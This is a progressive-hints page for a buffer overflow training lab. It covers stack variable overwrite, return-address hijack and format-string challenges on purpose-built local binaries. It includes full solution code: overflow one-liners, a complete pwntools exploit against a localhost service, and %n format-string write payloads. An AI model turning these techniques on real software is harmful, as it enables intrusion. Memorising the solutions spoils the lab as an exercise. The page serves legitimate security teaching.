# Buffer Overflow Hints

Progressive hints to help you through buffer overflow challenges.

---

## General Hints

### Hint 1: Understand the Goal

Before exploiting, understand what you're trying to achieve:
- **stack-vuln**: Overwrite a variable on the stack
- **vuln-server**: Overwrite return address to call secret_function
- **format-vuln**: Read/write memory using format specifiers

### Hint 2: Read the Banner

Each program provides hints:
- Buffer size
- Target addresses
- Vulnerability type

### Hint 3: Start Small

Test with small inputs first, then gradually increase:
```bash
echo "A" | ./program
echo "AAAAAAAAAA" | ./program
echo "AAAAAAAAAAAAAAAAAAAAAAAA" | ./program
```

---

## stack-vuln Hints

### Understanding the Challenge

<details>
<summary>Hint 1: Memory layout</summary>

```
Low Address
+----------------+
| password[0-31] |  <- Your input starts here
+----------------+
| authenticated  |  <- This is what you need to change
+----------------+
High Address
```

The password buffer is 32 bytes. Anything beyond that overflows into `authenticated`.
</details>

<details>
<summary>Hint 2: What value to write?</summary>

The program checks `if (authenticated)`. In C, any non-zero value is "true".

So you just need to write ANY non-zero byte after the 32-byte buffer.
</details>

<details>
<summary>Hint 3: Solution</summary>

```bash
# 32 A's fill the buffer, 33rd overwrites authenticated
python3 -c "print('A'*33)" | /app/stack-vuln

# Or more explicitly
python3 -c "print('A'*32 + '\x01')" | /app/stack-vuln
```
</details>

---

## vuln-server Hints

### Finding the Offset

<details>
<summary>Hint 1: Buffer + saved RBP</summary>

The server tells you the buffer is 64 bytes.

On x86_64:
- Buffer: 64 bytes
- Saved RBP: 8 bytes
- Return address: next 8 bytes

So offset to return address = 64 + 8 = 72 bytes
</details>

<details>
<summary>Hint 2: Using cyclic patterns</summary>

```python
from pwn import *

# Generate pattern
pattern = cyclic(100)
print(pattern)

# After crash, find offset
offset = cyclic_find(0x????????)  # Use crash value
```
</details>

<details>
<summary>Hint 3: Verify offset</summary>

```bash
# Test: 72 A's should reach the return address
python3 -c "print('A'*72 + 'BBBBBBBB')" | nc localhost 9999

# Program will crash trying to return to 0x4242424242424242
```
</details>

### Building the Exploit

<details>
<summary>Hint 1: Get the target address</summary>

The banner shows: `secret_function: 0x401196`

This address may vary - always read it from the banner!
</details>

<details>
<summary>Hint 2: Pack the address correctly</summary>

x86_64 uses little-endian byte order:

```python
from pwn import *

# Address: 0x401196
# In memory: \x96\x11\x40\x00\x00\x00\x00\x00

addr = p64(0x401196)
print(addr)  # b'\x96\x11@\x00\x00\x00\x00\x00'
```
</details>

<details>
<summary>Hint 3: Complete exploit</summary>

```python
from pwn import *

p = remote('localhost', 9999)

# Get banner and extract address
banner = p.recvuntil(b'secret_function:')
p.recvuntil(b'0x')
addr_str = p.recvuntil(b' ').strip()
target = int(addr_str, 16)

# Build payload
payload = b'A' * 72 + p64(target)

# Send after prompt
p.recvuntil(b'input:')
p.sendline(payload)
p.interactive()
```
</details>

---

## format-vuln Hints

### Reading Memory

<details>
<summary>Hint 1: Basic format strings</summary>

```bash
# These leak stack values:
%x      # Hex (32-bit)
%lx     # Hex (64-bit)
%p      # Pointer format (with 0x prefix)

# Try:
%p.%p.%p.%p.%p.%p
```
</details>

<details>
<summary>Hint 2: Positional access</summary>

Instead of printing all values up to position N:
```bash
# Access specific position
%6$p    # 6th value
%10$p   # 10th value

# Find where your input appears on stack
AAAA%p.%p.%p.%p.%p.%p.%p.%p
# Look for 0x41414141
```
</details>

<details>
<summary>Hint 3: Reading strings with %s</summary>

%s reads a string from an address on the stack.

To read from a specific address:
1. Put the address in your input
2. Use %s at the position where your input appears

```python
# If your input appears at position 7:
payload = p64(flag_address) + b'%7$s'
```
</details>

### Writing Memory

<details>
<summary>Hint 1: Understanding %n</summary>

`%n` writes the count of characters printed so far to an address.

```bash
# This prints 4 chars, then writes "4" to address on stack
AAAA%n

# Dangerous! Only use in controlled environments.
```
</details>

<details>
<summary>Hint 2: Controlling the write value</summary>

To write a specific value, print that many characters:
```bash
# To write 100, print 100 chars first
# %100c prints 100 spaces
%100c%n
```
</details>

<details>
<summary>Hint 3: Using pwntools fmtstr_payload</summary>

```python
from pwn import *
from pwnlib.fmtstr import fmtstr_payload

# Create payload to write 0x41414141 at address
# offset = where your input appears on stack
payload = fmtstr_payload(offset, {target_addr: 0x41414141})
```
</details>

---

## GDB Hints

<details>
<summary>Hint 1: Basic debugging setup</summary>

```bash
# Inside container
gdb /app/vuln-server

# Useful commands
break main
run
info registers
x/20x $rsp
```
</details>

<details>
<summary>Hint 2: Examining the stack</summary>

```bash
# View stack contents
(gdb) x/20gx $rsp     # 20 64-bit values

# View as strings
(gdb) x/s $rsp

# View instructions at address
(gdb) x/10i 0x401196
```
</details>

<details>
<summary>Hint 3: Using pwndbg/gef</summary>

```bash
# These extensions provide better views
# Install pwndbg for better debugging

# Useful commands:
pwndbg> checksec
pwndbg> vmmap
pwndbg> stack 20
pwndbg> telescope $rsp 20
```
</details>

---

## Troubleshooting

### Program crashes but no flag

<details>
<summary>Solution 1: Check offset</summary>

Your offset might be wrong. Verify with GDB or cyclic pattern.

```python
# Generate pattern
from pwn import *
print(cyclic(100))

# Find offset from crash address
print(cyclic_find(0x????????))
```
</details>

<details>
<summary>Solution 2: Stack alignment (64-bit)</summary>

64-bit programs need 16-byte stack alignment. Add a `ret` gadget:

```python
# Find ret gadget
# objdump -d binary | grep ret

ret_gadget = 0x40101a  # Example address

payload = b'A' * offset
payload += p64(ret_gadget)      # Align stack
payload += p64(secret_function)
```
</details>

### Null bytes in address

<details>
<summary>Solution</summary>

Addresses like `0x00401196` contain null bytes (0x00).
strcpy stops at null bytes.

Options:
1. The provided binaries use addresses without leading nulls
2. For other challenges, use techniques that don't require strcpy
3. Try format string write instead
</details>

### Connection closes immediately

<details>
<summary>Solution</summary>

```python
# Add small delay or use interactive mode
p.sendline(payload)
time.sleep(0.5)
p.interactive()

# Or check if payload is correct length
print(f"Payload length: {len(payload)}")
```
</details>

---

## Quick Reference

### Useful pwntools Functions

```python
from pwn import *

# Connection
p = remote('host', port)
p = process('./binary')

# Packing
p64(0x401196)   # 64-bit little-endian
p32(0x401196)   # 32-bit little-endian
u64(data)       # Unpack 64-bit
u32(data)       # Unpack 32-bit

# Patterns
cyclic(100)                  # Generate pattern
cyclic_find(0x61616174)      # Find offset

# Format string
fmtstr_payload(offset, {addr: value})
```

### Common Offsets

| Architecture | Saved BP | Return Addr After Buffer |
|--------------|----------|--------------------------|
| x86 (32-bit) | 4 bytes | buffer_size + 4 |
| x64 (64-bit) | 8 bytes | buffer_size + 8 |

### GDB Quick Commands

```bash
# Execution
run                    # Start program
continue (c)           # Continue execution
stepi (si)            # Step one instruction
nexti (ni)            # Step over call

# Breakpoints
break main            # Break at function
break *0x401234       # Break at address
delete                # Remove all breakpoints

# Memory/Registers
info registers        # All registers
print $rsp            # Specific register
x/20x $rsp           # Examine memory (hex)
x/s address          # Examine as string
x/i $rip             # Examine as instruction
```

---

**Back to:** [README](./README.md) | [Walkthrough](./walkthrough.md)
